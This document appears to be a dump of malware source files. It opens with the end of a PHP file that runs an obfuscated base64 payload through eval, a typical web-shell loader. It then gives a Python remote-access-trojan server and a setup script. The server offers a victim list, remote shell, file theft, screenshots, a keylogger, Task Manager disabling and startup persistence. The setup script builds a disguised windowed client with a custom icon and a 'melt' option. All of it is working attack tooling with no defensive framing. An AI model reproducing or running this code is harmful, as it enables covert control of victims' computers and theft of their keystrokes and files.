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"";
eval(htmlspecialchars_decode(urldecode(base64_decode($b3))));
exit;
?>"
server,"import socket, os, time, threading, sys, json
from queue import Queue
from cryptography.fernet import Fernet

arrAddresses = []
arrConnections = []

strHost = ""0.0.0.0""
intPort = 3000

intBuff = 1024

queue = Queue()

# function to return string with quotes removed
remove_quotes = lambda string: string.replace(""\"""", """")

# function to return title centered around string
center = lambda string, title: f""{{:^{len(string)}}}"".format(title)

# function to send data
send = lambda data: conn.send(objEncryptor.encrypt(data))

# function to receive data
recv = lambda buffer: objEncryptor.decrypt(conn.recv(buffer))


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""""
    while len(bytData) < buffer:
        bytData += conn.recv(buffer)
    return objEncryptor.decrypt(bytData)


def sendall(flag, data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(f""{flag}{intDataSize}"".encode())
    time.sleep(0.2)
    conn.send(bytEncryptedData)
    print(f""Total bytes sent: {intDataSize}"")


def create_encryptor():
    global objKey, objEncryptor
    objKey = Fernet.generate_key()
    objEncryptor = Fernet(objKey)


def create_socket():
    global objSocket
    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse a socket even if its recently closed
    except socket.error() as strError:
        print(f""Error creating socket {strError}"")


def socket_bind():
    global objSocket
    try:
        print(f""Listening on port {intPort}"")
        objSocket.bind((strHost, intPort))
        objSocket.listen(20)
    except socket.error() as strError:
        print(f""Error binding socket {strError} Retrying..."")
        socket_bind()


def socket_accept():
    while True:
        try:
            conn, address = objSocket.accept()
            conn.setblocking(1)  # no timeout
            address += tuple(json.loads(conn.recv(intBuff).decode()))
            conn.send(objKey)
            arrConnections.append(conn)
            arrAddresses.append(address)
            print(f""\nConnection has been established: {address[0]} ({address[2]})"")
        except socket.error:
            print(""Error accepting connections!"")
            continue


def _decode(data):
    try:
        return data.decode()
    except UnicodeDecodeError:
        try:
            return data.decode(""cp437"")
        except UnicodeDecodeError:
            return data.decode(errors=""replace"")


def menu_help():
    print(""\nH help"")
    print(""L List all connections"")
    print(""I Interact with connection"")
    print(""E Open remote cmd with connection"")
    print(""S Send command to every connection"")
    print(""C Close connection"")
    print(""X Exit and close all connections"")


def main_menu():
    while True:
        strChoice = input(""\n>> "").lower()

        refresh_connections()  # refresh connection list

        if strChoice == ""l"":
            list_connections()

        elif strChoice[:1] == ""i"" and len(strChoice) > 1:
            conn = select_connection(strChoice[2:], True)
            if conn is not None:
                send_commands()
        elif strChoice == ""h"":
            menu_help()

        elif strChoice[:1] == ""c"" and len(strChoice) > 1:
            conn = select_connection(strChoice[2:], False)
            if conn is not None:
                send(b""exit"")
                conn.close()

        elif strChoice == ""x"":
            close()
            break  # break to continue work() function

        elif strChoice[:1] == ""e"" and len(strChoice) > 1:
            conn = select_connection(strChoice[2:], False)
            if conn is not None:
                command_shell()

        elif strChoice[:1] == ""s"" and len(strChoice) > 1:
            send_command_all(strChoice[2:])
        else:
            print(""Invalid choice, please try again!"")
            menu_help()


def close():
    global arrConnections, arrAddresses, conn

    if len(arrAddresses) == 0:  # if there are no computers connected
        return

    for _, conn in enumerate(arrConnections):
        send(b""exit"")
        conn.close()
    del arrConnections
    arrConnections = []
    del arrAddresses
    arrAddresses = []


def refresh_connections():  # used to remove any lost connections
    global arrConnections, arrAddresses, conn
    for intCounter, conn in enumerate(arrConnections):
        try:
            send(b""test"")  # test to see if connection is active
        except socket.error:
            del arrAddresses[arrConnections.index(conn)]
            arrConnections.remove(conn)
            conn.close()


def list_connections():
    refresh_connections()

    if not len(arrConnections) > 0:
        print(""No connections."")
        return

    strClients = """"
    for intCounter, arrAddress in enumerate(arrAddresses):
        strClients += f""{intCounter}""
        for value in arrAddress:
            strClients += f""{4 * ' '}{str(value)}""
        strClients += ""\n""

    strInfo = f""\nID{3 * ' '}""
    for index, text in enumerate([""IP"", ""Port"", ""PC Name"", ""OS"", ""User""]):
        strInfo += center(f""{arrAddresses[0][index]}"", text) + 4 * "" ""
    strInfo += f""\n{strClients}""
    print(strInfo, end="""")


def select_connection(connection_id, blnGetResponse):
    global conn, arrInfo
    try:
        connection_id = int(connection_id)
        conn = arrConnections[connection_id]
    except:
        print(""Invalid choice, please try again!"")
        return
    else:
        '''
        IP, PC Name, OS, User
        '''
        arrInfo = tuple()
        for index in [0, 2, 3, 4]:
            arrInfo += (f""{arrAddresses[connection_id][index]}"",)

        if blnGetResponse:
            print(f""You are connected to {arrInfo[0]} ....\n"")
        return conn


def send_command_all(command):
    if os.path.isfile(""command_log.txt""):
        open(""command_log.txt"", ""w"").close()  # clear previous log contents

    for intCounter in range(0, len(arrAddresses)):
        conn = select_connection(intCounter, False)

        if conn is not None and command != ""cmd"":
            send_command(command)


def user_info():
    for index, text in enumerate([""IP: "", ""PC Name: "", ""OS: "", ""User: ""]):
        print(text + arrInfo[index])


def screenshot():
    send(b""screen"")
    strScrnSize = recv(intBuff).decode()  # get screenshot size
    print(f""\nReceiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait..."")

    intBuffer = int(strScrnSize)

    strFile = time.strftime(""%Y%m%d%H%M%S.png"")

    ScrnData = recvall(intBuffer)  # get data and write it
    with open(strFile, ""wb"") as objPic:
        objPic.write(ScrnData)

    print(f""Done!\nTotal bytes received: {os.path.getsize(strFile)} bytes"")


def browse_files():
    send(b""filebrowser"")
    print(""\nDrives :"")

    strDrives = recv(intBuff).decode()
    print(f""{strDrives}\n"")

    strDir = input(""Directory: "")

    if strDir == """":
        # tell the client of the invalid directory
        strDir = ""Invalid""

    send(strDir.encode())

    strClientResponse = recv(intBuff).decode()  # get buffer size

    if strClientResponse == ""Invalid Directory!"":  # if the directory is invalid
        print(f""\n{strClientResponse}"")
        return

    intBuffer = int(strClientResponse)
    strClientResponse = recvall(intBuffer).decode()  # receive full data

    print(f""\n{strClientResponse}"")


def startup():
    send(b""startup"")
    print(""Registering ..."")

    strClientResponse = recv(intBuff).decode()
    if not strClientResponse == ""success"":
        print(strClientResponse)


def remove_from_startup():
    send(b""rmvstartup"")
    print(""Removing ..."")

    strClientResponse = recv(intBuff).decode()
    if not strClientResponse == ""success"":
        print(strClientResponse)


def send_file():
    strFile = remove_quotes(input(""\nFile to send: ""))
    if not os.path.isfile(strFile):
        print(""Invalid File!"")
        return

    strOutputFile = remove_quotes(input(""\nOutput File: ""))
    if strOutputFile == """":  # if the input is blank
        return

    with open(strFile, ""rb"") as objFile:
        sendall(""send"", objFile.read())

    send(strOutputFile.encode())

    strClientResponse = recv(intBuff).decode()
    print(strClientResponse)


def receive():
    strFile = remove_quotes(input(""\nTarget file: ""))
    strFileOutput = remove_quotes(input(""\nOutput File: ""))

    if strFile == """" or strFileOutput == """":  # if the user left an input blank
        return

    send((""recv"" + strFile).encode())
    strClientResponse = recv(intBuff).decode()

    if strClientResponse == ""Target file not found!"":
        print(strClientResponse)
        return

    print(f""File size: {strClientResponse} bytes\nPlease wait..."")
    intBuffer = int(strClientResponse)

    file_data = recvall(intBuffer)  # get data and write it

    try:
        with open(strFileOutput, ""wb"") as objFile:
            objFile.write(file_data)
    except:
        print(""Path is protected/invalid!"")
        return

    print(f""Done!\nTotal bytes received: {os.path.getsize(strFileOutput)} bytes"")


def command_shell():  # remote cmd shell
    send(b""cmd"")
    strDefault = f""\n{_decode(recv(intBuff))}>""
    print(strDefault, end="""")  # print default prompt

    while True:
        strCommand = input()
        if strCommand in [""quit"", ""exit""]:
            send(b""goback"")
            break

        elif strCommand == ""cmd"":  # commands that do not work
            print(""Please do use not this command!"")
            print(strDefault, end="""")

        elif len(strCommand) > 0:
            send(strCommand.encode())
            intBuffer = int(recv(intBuff).decode())  # receive buffer size
            strClientResponse = _decode(recvall(intBuffer))
            print(strClientResponse, end="""")  # print cmd output
        else:
            print(strDefault, end="""")


def python_interpreter():
    send(b""python"")
    recv(intBuff)
    while True:
        strCommand = input(""\n>>> "")
        if strCommand.strip() == """":
            continue
        if strCommand in [""exit"", ""exit()""]:
            break
        send(strCommand.encode())
        intBuffer = int(recv(intBuff).decode())
        strReceived = recvall(intBuffer).decode(""utf-8"").rstrip(""\n"")
        if strReceived != """":
            print(strReceived)
    send(b""exit"")
    recv(intBuff)


def disable_taskmgr():
    send(b""dtaskmgr"")
    print(recv(intBuff).decode())  # print response


def keylogger(option):
    if option == ""start"":
        send(b""keystart"")
        if recv(intBuff) == b""error"":
            print(""Keylogger is already running."")

    elif option == ""stop"":
        send(b""keystop"")
        if recv(intBuff) == b""error"":
            print(""Keylogger is not running."")

    elif option == ""dump"":
        send(b""keydump"")
        intBuffer = recv(intBuff).decode()

        if intBuffer == ""error"":
            print(""Keylogger is not running."")
        elif intBuffer == ""error2"":
            print(""No logs."")
        else:
            strLogs = recvall(int(intBuffer)).decode(errors=""replace"")  # get all data
            print(f""\n{strLogs}"")


def send_command(command):
    send((""runcmd"" + command).encode())
    intBuffer = int(recv(intBuff).decode())  # receive buffer size

    strClientResponse = f""{24 * '='}\n{arrInfo[0]}{4 * ' '}{arrInfo[1]}{recvall(intBuffer).decode()}{24 * '='}""

    if os.path.isfile(""command_log.txt""):
        strMode = ""a""
    else:
        strMode = ""w""

    with open(""command_log.txt"", strMode) as objLogFile:
        objLogFile.write(f""{strClientResponse}\n\n"")


def show_help():
    print(""H Help"")
    print(""M Send message"")
    print(""R Receive file from the user"")
    print(""S Send file to the user"")
    print(""P Take screenshot"")
    print(""A (1) Add to startup"")
    print(""A (2) Remove from startup"")
    print(""V View files"")
    print(""U User Info"")
    print(""E Open remote cmd"")
    print(""I Open remote python interpreter"")
    print(""D Disable task manager"")
    print(""K (start) (stop) (dump) Keylogger"")
    print(""X (1) Lock user"")
    print(""X (2) Restart user"")
    print(""X (3) Shutdown user"")
    print(""B Move connection to background"")
    print(""C Close connection"")


def send_commands():
    show_help()
    try:
        while True:
            strChoice = input(""\nType selection: "").lower()

            if strChoice == ""h"":
                print()
                show_help()
            elif strChoice == ""c"":
                send(b""exit"")
                conn.close()
                break
            elif strChoice[:1] == ""m"" and len(strChoice) > 1:
                strMsg = ""msg"" + strChoice[2:]
                send(strMsg.encode())
            elif strChoice == ""a 1"":
                startup()
            elif strChoice == ""a 2"":
                remove_from_startup()
            elif strChoice == ""u"":
                user_info()
            elif strChoice == ""p"":
                screenshot()
            elif strChoice == ""i"":
                python_interpreter()
            elif strChoice == ""v"":
                browse_files()
            elif strChoice == ""s"":
                send_file()
            elif strChoice == ""r"":
                receive()
            elif strChoice == ""x 1"":
                send(b""lock"")
            elif strChoice == ""x 2"":
                send(b""shutdown"")
                conn.close()
                break
            elif strChoice == ""x 3"":
                send(b""restart"")
                conn.close()
                break
            elif strChoice == ""b"":
                break
            elif strChoice == ""e"":
                command_shell()
            elif strChoice == ""d"":
                disable_taskmgr()
            elif strChoice == ""k start"":
                keylogger(""start"")
            elif strChoice == ""k stop"":
                keylogger(""stop"")
            elif strChoice == ""k dump"":
                keylogger(""dump"")
            else:
                print(""Invalid choice, please try again!"")

    except socket.error as e:  # if there is a socket error
        print(f""Error, connection was lost! :\n{e}"")
        return


def create_threads():
    for _ in range(2):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()
    queue.join()


def work():  # do jobs in the queue
    while True:
        intValue = queue.get()
        if intValue == 1:
            create_encryptor()
            create_socket()
            socket_bind()
            socket_accept()
        elif intValue == 2:
            while True:
                time.sleep(0.2)
                if len(arrAddresses) > 0:
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for intThread in [1, 2]:
        queue.put(intThread)  # put thread id into list
    queue.join()


create_threads()
create_jobs()"
setup,"import os, sys, socket, shutil

# get the path to python install dir
python_path = ""\"""" + os.path.dirname(sys.executable)

os.chdir(os.path.dirname(os.path.abspath(__file__)))

try:
    # create a dummy socket to get local IP address
    objSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    objSocket.connect((""google.com"", 0))
    strCurrentIP = objSocket.getsockname()[0]
    objSocket.close()
except socket.error:
    print(""Make sure you are connected to the internet."")
    sys.exit(0)

# check to make sure client.py exists
if not os.path.isfile(""client.py""):
    print(""client.py not found!"")
    sys.exit(0)


print(""1. Use: "" + strCurrentIP)
print(""2. Use a different IP address for server"")
print(""3. Use a DNS Hostname"")
print(""4. Use 127.0.0.1 (for testing on this computer)"")

strChoice = """"
strChoice = input(""\n"" + ""Type selection: "")

if strChoice == ""1"":
    pass
elif strChoice == ""2"":
    strCurrentIP = input(""\n"" + ""Enter IP: "")
elif strChoice == ""3"":
    strDNSHostname = input(""\n"" + ""Enter DNS Hostname: "")
elif strChoice == ""4"":
    strCurrentIP = ""127.0.0.1""
else:
    print(""Invalid Choice!"")
    sys.exit(0)

strPort = input(""\n"" + ""Enter port number (Press ENTER for default): "")

if strPort == """":
    pass
else:
    # check to make sure port is a number between 0 and 65535
    if not strPort.isdigit():
        print(""You must enter numeric value!"")
        sys.exit(0)
    elif not 0 <= int(strPort) <= 65535:
        print(""You must enter a port between 0 and 65535!"")
        sys.exit(0)

    # check to make sure server exists
    elif not os.path.isfile(""server.py""):
        print(""server.py not found!"")
        sys.exit(0)

    # open server and put all lines in an array
    objServerFile = open(""server.py"", ""r"")
    arrFileContents = objServerFile.readlines()
    objServerFile.close()

    # use loop in order to ensure that line number doesnt matter
    for intCounter in range(0, len(arrFileContents)):
        # if the current line is the line that sets the port, set the port
        if arrFileContents[intCounter][0:9] == ""intPort ="":
            arrFileContents[intCounter] = ""intPort = "" + strPort + ""\n""
            break

    # write lines to server
    objServerFile = open(""server.py"", ""w"")
    objServerFile.writelines(arrFileContents)
    objServerFile.close()


objClientFile = open(""client.py"", ""r"")
arrFileContents = objClientFile.readlines()
objClientFile.close()

# if the user is not using dns
if strChoice == ""2"" or strChoice == ""1"" or strChoice == ""4"":
    for intCounter in range(0, len(arrFileContents)):
        # check for the first occurrence of the host
        if arrFileContents[intCounter][0:9] == ""strHost ="" or arrFileContents[intCounter][0:11] == ""# strHost ="":
            # set strHost to be the IP
            arrFileContents[intCounter] = ""strHost = \"""" + strCurrentIP + ""\"""" + ""\n""
            # comment out the line below used for DNS
            arrFileContents[intCounter + 1] = ""# strHost = socket.gethostbyname(\""\"")"" + ""\n""
            # break for the first occurrence
            break
else:
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:9] == ""strHost ="" or arrFileContents[intCounter][0:11] == ""# strHost ="":
            arrFileContents[intCounter] = ""# strHost = \""\"""" + ""\n""
            arrFileContents[intCounter + 1] = ""strHost = socket.gethostbyname(\"""" + strDNSHostname + ""\"")"" + ""\n""
            break

if strPort != """":
    # if the user entered a custom port, change it in the client
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:9] == ""intPort ="":
            arrFileContents[intCounter] = ""intPort = "" + strPort + ""\n""
            break

objClientFile = open(""client.py"", ""w"")
objClientFile.writelines(arrFileContents)
objClientFile.close()


strMeltChoice = input(""\n"" + ""Melt file on execution to tmp folder? y/n: "")

objClientFile = open(""client.py"", ""r"")
arrFileContents = objClientFile.readlines()
objClientFile.close()

if strMeltChoice == ""y"":
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:13] == ""blnMeltFile ="":
            arrFileContents[intCounter] = ""blnMeltFile = True"" + ""\n""
            break
else:
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:13] == ""blnMeltFile ="":
            arrFileContents[intCounter] = ""blnMeltFile = False"" + ""\n""
            break

objClientFile = open(""client.py"", ""w"")
objClientFile.writelines(arrFileContents)
objClientFile.close()


strAddToStartup = input(""\n"" + ""Add program to startup on launch? y/n: "")

objClientFile = open(""client.py"", ""r"")
arrFileContents = objClientFile.readlines()
objClientFile.close()

if strAddToStartup == ""y"":
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:17] == ""blnAddToStartup ="":
            arrFileContents[intCounter] = ""blnAddToStartup = True"" + ""\n""
            break
else:
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:17] == ""blnAddToStartup ="":
            arrFileContents[intCounter] = ""blnAddToStartup = False"" + ""\n""
            break

objClientFile = open(""client.py"", ""w"")
objClientFile.writelines(arrFileContents)
objClientFile.close()


strUPXChoice = input(""\n"" + ""Use UPX? y/n (Decreases file size but may not work on fresh computers): "")

if strUPXChoice == ""y"":
    strUPX = """"
else:
    # https://github.com/pyinstaller/pyinstaller/issues/3005
    try:
        strUPX = ""--noupx""
        shutil.rmtree(os.environ[""APPDATA""] + ""/pyinstaller"")
    except:
        pass

strIconChoice = input(""\n"" + ""Path for icon (Press ENTER to skip): "")

# remove quotes if there are any
strIconChoice = strIconChoice.replace(""\"""", """")

# if the user did not choose an icon build the client using pyinstaller
if strIconChoice == """":
    os.system(python_path + ""/Scripts/pyinstaller\"" client.py "" + strUPX + "" --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module FixTk --exclude-module tcl --exclude-module tk ""
                      ""--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter ""
                      ""--onefile --windowed"")
# check to make sure the icon exists and that it is a .ico file
elif not os.path.isfile(strIconChoice):
    print(""Invalid path!"")
    sys.exit(0)
elif not strIconChoice.endswith("".ico""):
    print(""Must be a .ico file!"")
    sys.exit(0)
else:
    # build the client with an icon
    os.system(python_path + ""/Scripts/pyinstaller\"" client.py "" + strUPX + "" --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module FixTk --exclude-module tcl --exclude-module tk ""
                      ""--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter ""
                      ""--onefile --windowed --icon=\"""" + strIconChoice + ""\"""")"
